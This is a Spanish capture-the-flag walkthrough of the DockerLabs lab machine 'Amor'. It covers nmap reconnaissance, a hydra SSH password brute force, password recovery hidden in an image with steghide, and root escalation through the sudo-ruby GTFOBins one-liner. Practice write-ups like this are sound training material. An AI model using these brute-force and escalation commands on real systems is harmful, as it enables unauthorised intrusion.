# Máquina Amor

## Reconocimiento 

Primero realizamos un escaner **nmap** para descubrir los puertos abiertos de la máquina objetivo.

```shell
# Nmap 7.94SVN scan initiated Thu Jun 20 16:43:49 2024 as: nmap -p- -sC -sV -sS --min-rate 5000 -n -Pn -oN nmap 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 20 16:43:55 2024 -- 1 IP address (1 host up) scanned in 6.82 seconds
```

Vemos que tiene el puerto 80 abierto, asi que procedemos a investigarlo. Y vemos que ha habido problemas en la seguridad debido a 
una contraseña fácil.

![image](https://github.com/miiguelpalaces/DockerLabs/assets/129620259/c17aaa47-c15a-46aa-b9b7-5421abe01730)

## Explotación

Por lo que realizamos un ataque hydra a los usuarios buscando la contraseña.

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/amor]
└─$ hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

Y obtenemos la siguiente brecha **carlota:babygirl**. Por lo que realizamos una conexión ssh, porque también estaba abierto el puerto 22.

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/amor]
└─$ ssh carlota@172.17.0.2                                                     
carlota@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.5.0-kali3-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Jun 20 15:29:25 2024 from 172.17.0.1
$ bash
carlota@7529c9daea54:~$ 
```

Navegando por la máquina descubrimos una imagen en uno de los directorios de **carlota**

```shell
carlota@7529c9daea54:~/Desktop/fotos/vacaciones$ ls
imagen.jpg
```

Procedemos a obtenerla desde nuestra máquina atacante a partir del siguiente comando.

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/amor]
└─$ scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/miguel/Desktop/machines/Dockerlabs/amor 
carlota@172.17.0.2's password: 
imagen.jpg                                                                        100%   51KB  23.8MB/s   00:00  
```

Y buscamos información dentro de la imagen a partir de la herramienta **steghide**

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/amor]
└─$ steghide --extract -sf imagen.jpg 
```

Importa el resultado a un archivo **secret.txt** y al imprimirlo obtenemos una contraseña en lo que parece base 64.
Por lo que la descodificamos obteniendo la siguiente contraseña.

```shell
┌──(miguel㉿miguel)-[~/Desktop/machines/Dockerlabs/amor]
└─$ echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo 
eslacasadepinypon
```
Ahora desde el user **carlota** nos cambiamos al user **oscar** usando la contraseña anterior.

```shell
carlota@7529c9daea54:~/Desktop/fotos/vacaciones$ su oscar
Password: 
$ whoami
oscar
```

## Escalada de privilegios 

Procedemos a buscar una brecha para escalar privilegios hasta **root**.

```shell
oscar@7529c9daea54:/home/carlota/Desktop/fotos/vacaciones$ sudo -l
Matching Defaults entries for oscar on 7529c9daea54:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User oscar may run the following commands on 7529c9daea54:
    (ALL) NOPASSWD: /usr/bin/ruby
```
Buscando en la página Gtfobins obtenemos la siguiente posibilidad.

```shell
oscar@7529c9daea54:/home/carlota/Desktop/fotos/vacaciones$ sudo /usr/bin/ruby -e 'exec "/bin/sh"'
# whoami
root
```















